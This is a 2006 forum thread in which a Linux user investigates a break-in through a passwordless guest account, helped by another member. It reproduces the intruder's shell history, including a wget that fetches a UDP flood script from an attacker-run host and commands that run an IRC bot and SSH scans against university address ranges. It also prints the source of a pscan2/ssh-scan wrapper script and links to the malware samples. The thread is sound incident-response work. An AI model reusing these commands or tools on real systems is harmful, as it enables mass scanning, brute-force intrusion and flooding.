---
title: "Pscan2"
date: 2006-09-08
forum: Desktop Environments
---

### Post by Lunar_Lamp on 2006-09-08
[edit: I am now confident someone is trying to hack me AS I TYPE]

I was sitting on my laptop and noticed that the CPU usage suddenly went up to 100%

I typed in "top" to see what was sucking my CPU, as I didn't think I was doing anything intensive, and Pscan2 was listed as sucking ~95% of my CPU cycles.  I thought this strange and hadn't heard of the process, and it didn't have a man page.  Close examination revealed that the user running it was "guest".  Even more intriguing.  I had forgotten that I set up a guest account a few months back, with no password, for when I was on holiday so people could transfer photos from their digital cameras onto my laptop easily.

I used sudo to kill the process as I didn't have any knowledge of what it was doing nor why.  A google search on pscan2 seems to suggest it is a C program that port scans the host's computer.

Is it possible that someone had gained access to my guest account remotely and was attempting to port scan me?  I really have no idea what was going on, but figured a "kill and wait" was a decent idea.

Hmmm, now I am getting the guest account running "ssh-scan".  How do I trace this, as it cannot be good.

---

### Post by tuxinvader on 2006-09-08
I would leave the app running, but pull the lan cable out.

Check the last log run "last | less" in a terminal and look for the guest account and where it logged on from.

you should also check the .bash_history file in the guest account home directory.

---

### Post by tuxinvader on 2006-09-08
you can't really trust the system anymore. For investigation you might be better off shutting it down (preferably hard) run sync three times in a terminal and then hit the reset button / pull the battery out.

Then boot of a liveCD and mount the partitions. You need to this so you know ls and find etc haven't been root kitted.

---

### Post by Lunar_Lamp on 2006-09-08
Well, I killed the processes a few times:

When I did "sudo killall ssh-scan" a pscan2 reappeared, which I killed and then rebooted.  I have changed the guest account password, and removed it from all access-groups.


last | less from today:

ed       :0                            Fri Sep  8 13:11   still logged in   
guest    :0                            Fri Sep  8 13:10 - 13:11  (00:01)    
reboot   system boot  2.6.15-26-k7     Fri Sep  8 13:09          (00:09)    
guest    pts/0        86.121.100.83    Fri Sep  8 12:35 - down   (00:32)    
guest    pts/0        204.249.177.66   Fri Sep  8 12:33 - 12:35  (00:01)    
ed       :0                            Fri Sep  8 09:09 - down   (03:58)    
reboot   system boot  2.6.15-26-k7     Fri Sep  8 09:08          (03:59)

---

### Post by Lunar_Lamp on 2006-09-08
Ok, checking out what he was doing (I'm not sure, but I think some of the old ones may be me, but everything after and including the "ps -x" was NOT me or a guest I don't think).  Is tehre a way to check timestamps on this?

```
sudo apt-get update
exit
fglrxinfo 
exit
sudo nano /boot/grub/menu.lst
fglrxinfo 
reboot
sudo reboot
exit
w
hostname
ps -x
hostname -f
last -20
passwd
uname -a
uname -r
ls
cat /etc/issue
uname -a
w
cat /proc/cpuinfo
ls
cd /var/tmp
ls
cd /tm
cd /tmp
ls
cd /var/tmp
mkdir .a
cd .a
ls
wget http://b3ngos.home.ro/udp.pl
ps axl
passwd ed
last -20
tar xzvf bot.tgz
cd edu
./mech
ps axl
cd ..
tar xzvf list.jpg
cd list
./a 128.105;./a 120.201;./a 128.204;./a 128.205;./a 128.139

```

---

### Post by tuxinvader on 2006-09-08
You really should boot of a live CD. You can't analyse your system unless you know you can trust the binaries you are using. The guest account has logged in from a couple of addresses today already, you have been cracked and you can't trust your system anymore. You must boot off of a live cd and then start inspecting init, the kernel, etc to find out what they did.

Bet you wont leave a password less login on your syste again ;)

whois 86.121.100.83

inetnum:        86.121.100.0 - 86.121.100.255
netname:        RO-RDS-CABLELINK
descr:          Romania Data Systems
descr:          Cablelink Customers - Bucharest
country:        RO

I can help you go through it if you like on irc or msn?

---

### Post by tuxinvader on 2006-09-08
so you have a list.jpg file on your system that isn't a picture, but a tar file. It contains some app they compiled on another system. ./a is the application, those numbers could be subnets? Perhaps scanning for other hosts? It's possible this is a worm of some kind. Do you have any antivirus?

---

### Post by tuxinvader on 2006-09-08
whois 128.105.0.0

OrgName:    University of Wisconsin-Madison
OrgID:      UNIVER-17
Address:    Computer Systems Lab

whois 120.201.0.0
Unknown AS number or IP network. Please upgrade this program.

whois 128.204.0.0
No match found for 128.204.0.0.

whois 128.205.0.0

OrgName:    State University of New York at Buffalo
OrgID:      SUNYAB-2
Address:    305 Computing Center

whois 128.139.0.0
inetnum:        128.139.0.0 - 128.139.31.255
netname:        HUJI-128-NET
descr:          Hebrew University of Jerusalem
country:        IL

---

### Post by Lunar_Lamp on 2006-09-08
```
clamdscan /var/tmp/list.jpg 
/var/tmp/list.jpg: Linux.RST.B-1 FOUND

----------- SCAN SUMMARY -----------
Infected files: 1
Time: 0.564 sec (0 m 0 s)
```

It has been extracted as a folder in there called list.  One of the files is a list of user/pass combos, mine not included thankfully.

---

### Post by Lunar_Lamp on 2006-09-08
the program "a" is this:

```
#!/bin/bash
if [ $# != 1 ]; then
        echo " usage: $0 <b class>"
        exit;
fi


echo "### Super Sonic Scaner Build by BengoS  ###"
echo "### Lets ride baby"
echo "### I Love U Cristina"
./pscan2 $1 22 

sleep 10
cat $1.pscan.22 |sort |uniq > mfu.txt
oopsnr2=`grep -c . mfu.txt`
echo "# done"
echo "# founded  $oopsnr2 ips"
echo "----------------------------------------"
echo "# Lets Start the checking !"
./ssh-scan 100
rm -rf $1.pscan.22 mfu.txt
echo "thats all , go 1 more time;)"
```

So it's just a shell script to run pscan2 basically.  pscan2 can be found here I think:
[http://www.phreak.org/archives/exploits/unix/network-scanners/pscan2.c](http://www.phreak.org/archives/exploits/unix/network-scanners/pscan2.c)

---

### Post by tuxinvader on 2006-09-08
Sophos antivirus says:

Linux/Rst-B will attempt to infect all ELF executables in the current working directory and the directory /bin

If Linux/Rst-B is executed by a privileged user then it may attempt to create a backdoor on the system. This is achieved by opening a socket and listening for a particular packet containing details about the origin of the attacker and the command the attacker would like to execute on the system.

Was Guest in the admin group??? Could it sudo?

What's in /var/tmp/.a ?

---

### Post by tuxinvader on 2006-09-08
That udp.pl file they downloaded says:

#!/usr/bin/perl
#####################################################
# udp flood.
#
# Pulamea...nu sti sa floodezi cu el? perl udp.pl ip port 0
#
# --/odix
######################################################

---

### Post by Lunar_Lamp on 2006-09-08
I am 99% sure that it wasn't in the wheel group.  How can I check?  I removed it from all groups as and when I noticed it was being logged into, so I can't check for sure.

---

### Post by tuxinvader on 2006-09-08
check /etc/group-

Also I just noticed "passwd ed"
Did you create the user ed? You should change it's passwd too and check it's groups. Has anyone logged in as ed?

---

### Post by tuxinvader on 2006-09-08
Did you boot from a LiveCD? I would strongly suggest you do (especially if it  turns out guest was in wheel) and if you are on a dynamic ip address I would release and renew to get onto a different IP.

Forensically speaking we shouldn't be making changes.

---

### Post by Lunar_Lamp on 2006-09-08
"passwd" ed does not worry me.  'ed' is my username, and I was logged in.  I just did a test and guest would NOT have been able to change the password or anything; it would have just gotten an error message

---

### Post by tuxinvader on 2006-09-08
This is interesting [http://www.southerncrx.com/]("http://www.southerncrx.com/")

 "HACKED BY B3ngoS & |_X_| & Xv1d. JOIN. IRC Channal #hack3rs."

---

### Post by Lunar_Lamp on 2006-09-08
Where did you get that url?  Also, I can't get irc here at work due to proxy settings.

edit: I see, you just googled the maker of one of the scripts

---

### Post by tuxinvader on 2006-09-08
B3ngoS was in the url he downloaded udp.pl from and Google did the rest.

you might want to look at this too [http://64.233.183.104/search?q=cache:NR4jDJAOnyQJ:da.gogloom.com/Undernet/Hack3rs/+b3ngos&hl=en&lr=&client=firefox&strip=1]("http://64.233.183.104/search?q=cache:NR4jDJAOnyQJ:da.gogloom.com/Undernet/Hack3rs/+b3ngos&hl=en&lr=&client=firefox&strip=1")

---

### Post by Lunar_Lamp on 2006-09-08
I'm half tempted to change it back to see if they try again, and this time keep a close eye on exactly what they are doing.

---

### Post by tuxinvader on 2006-09-08
Really? If you can afford to set aside that laptop for use as a honeypot then I would ensure you delete all your files off of it first. You don't want to be a victim of identity theft!

---

### Post by Lunar_Lamp on 2006-09-08
I've uploaded the files that were on my pc if anyone wants to see.  There were 2 directories (.a and list/) both of which are contained here.

[http://www.megaupload.com/?d=2TVQ065H](http://www.megaupload.com/?d=2TVQ065H)
[http://www.megaupload.com/?d=VXZRMY9W](http://www.megaupload.com/?d=VXZRMY9W)

---

### Post by tuxinvader on 2006-09-08
You might want to check if you have a directory called /usr/bin/.system/
The core file in the .a directory looks like it was run inside /usr/bin/.system. The files from the tar file, but it's possible you have that dir too.

---

### Post by Lunar_Lamp on 2006-09-08
I have no /usr/bin/.system 

How did you view the core files, iirc they were binaries weren't they?  Did you decompile them, or are you viewing a file I missed when I was looking at them?

---

### Post by tuxinvader on 2006-09-08
I just used strings, strings core | less.

I think we can conlude:

The .a dir contains a IRC bot, which logs into channel #SmileyMemory on undernet and takes commands from the 1337 hax0rs there.

The list dir contains a ssh worm which scans given network ranges for vulnerable ssh daemons. At some point it makes a http call for the script "~telcom69/gov.php". You should google that! 

[COLOR="Red"][edit] It's not an ssh worm, It's an ssh scanner that is infected with a virus. The http call is part of the virus. The scanner just appears to brute force ssh logons[/edit][/COLOR]

What is very interesting is the core file in the dir is from a server called psmtestingserver. Could that be the writers test box? If so it also contains the ip he connected to it from 80.97.190.43.

Maybe they are working their way through the universities of the world? Given that list of IPs from an earlier post.

They don't seem to be bothered about covering their tracks, so you're probably quite lucky. It would seem unlikely they have put a root kit on without using it to hide their processes and directories.

---

### Post by Lunar_Lamp on 2006-09-08
I half wish I could get on irc to chat to them and see what's going on.  I also think that I managed to escape with no harm done in the end - but I'll probably do a clean install of Edgy in a couple of weeks anyway, so I guess that I will never find out anything massively long term and hidden.

---

### Post by tuxinvader on 2006-09-08
The ssh-scan is just INFECTED with the rst virus. I was wrong about it being a ssh worm. The ssh scanner is just infected. You should read [this]("http://www.lockeddown.net/rst-expl.txt")

Esp. > The virus infects binary files
in the ELF format and the code only works on Linux.  To detect this virus
look for the existence of /dev/hdx, /dev/hdx1, or /dev/hdx2, that would
be a sign the virus has achieved root.

---

### Post by Lunar_Lamp on 2006-09-08
ls /dev | grep hd
hda
hda1
hda2
hda3
hda4
hdc


It seems I'm OK.  How or why I don't know though.

---

